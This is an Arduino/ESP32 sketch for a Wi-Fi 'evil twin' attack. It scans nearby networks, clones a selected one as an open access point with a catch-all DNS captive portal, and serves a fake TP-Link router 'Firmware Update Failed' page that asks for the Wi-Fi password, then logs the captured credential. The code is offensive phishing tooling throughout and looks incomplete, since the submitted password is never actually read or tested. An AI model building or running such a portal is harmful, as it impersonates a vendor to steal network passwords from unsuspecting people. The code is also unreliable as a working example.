#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <HTTPClient.h>

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: 'Century Gothic', sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               ".nav-bar { background-color: #242424; color: #fff; display: flex; justify-content: space-between; align-items: center; padding: 1rem 2rem; }"
               ".nav-bar-title { font-size: 1.2rem; font-weight: bold; }"
               ".nav-links { display: flex; list-style: none; }"
               ".nav-links li { margin-right: 2rem; }"
               ".nav-links a { color: #fff; text-decoration: none; }"
               "textarea { width: 100%; }"
               ".q a { display: block; text-align: center; }"
               ;
  String h = "<!DOCTYPE html><html lang='en'>"
             "<head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>"
             "<title>" + a + " :: " + t + "</title>"
             "<link rel='stylesheet' href='styles.css'>"
             "<style>" + CSS + "</style>"
             "</head>"
             "<body><nav class='nav-bar'><span class='nav-bar-title'>TP-Link</span><ul class='nav-links'><li><a href='#'>Wireless N Router</a></li><li><a href='#'>Model No. TL-WR840N</a></li></ul></nav>"
             "<div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class='q'><a>&#169; All rights reserved.</a></div></body></html>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</div><div><form action='/' method='post'><label for='password'>WiFi password:</label>"
         "<input type='password' id='password' name='password' minlength='8'><input type='submit' value='Continue'></form>" + footer();
}


void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiPhi_34732", "d347h320");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("WiPhi_34732", "d347h320");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("WiPhi_34732", "d347h320");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><a href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button>Select</button></a></td></tr>";
    }

    if (_selectedNetwork.ssid == "") {
      _html.replace("{hotspot_button}", "Start Evil Twin (select AP first)");
      _html.replace("{hotspot}", "start");
      _html.replace("{disabled}", "disabled");
    } else {
      _html.replace("{hotspot_button}", "Start Evil Twin");
      _html.replace("{hotspot}", "start");
      _html.replace("{disabled}", "");
    }

    _html += "</table><div></body></html>";

    webServer.send(200, "text/html", _html);
    performScan();
  } else {
    String h = header("Login to " + _selectedNetwork.ssid);
    String f = footer();
    String _index = index();
    webServer.send(200, "text/html", h + _index + f);
  }
}

void handleAdmin() {
  String h = header("Wi-Fi list.");
  String f = footer();
  String _html = _tempHTML;
  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><a href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button>Select</button></a></td></tr>";
  }
  if (_selectedNetwork.ssid == "") {
    _html.replace("{hotspot_button}", "Start Evil Twin (select AP first)");
    _html.replace("{hotspot}", "start");
    _html.replace("{disabled}", "disabled");
  } else {
    _html.replace("{hotspot_button}", "Start Evil Twin");
    _html.replace("{hotspot}", "start");
    _html.replace("{disabled}", "");
  }
  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", h + _html + f);
}

String bytesToStr(uint8_t* b, uint8_t bl) {
  String bStr = "";
  for (uint8_t i = 0; i < bl; i++) {
    char buf[3];
    sprintf(buf, "%02X", b[i]);
    bStr += buf;
    if (i < bl - 1) {
      bStr += ":";
    }
  }
  return bStr;
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  delay(10);
}
